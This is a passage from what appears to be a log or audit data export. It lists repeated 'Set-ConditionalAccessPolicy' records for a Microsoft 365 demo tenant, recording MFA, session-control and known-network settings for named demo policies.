PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/4/2020 1:49:52 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/4/2020 5:28:36 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '8/4/2020 5:28:36 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/5/2020 2:23:25 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/5/2020 2:23:25 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:31 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:30 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:30 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:33 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:32 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:30 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:29 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:31 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:15 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:16 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/6/2020 5:18:56 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 5:18:55 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:16 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:16 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:15 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:30 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:32 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:16 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:16 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/7/2020 3:03:46 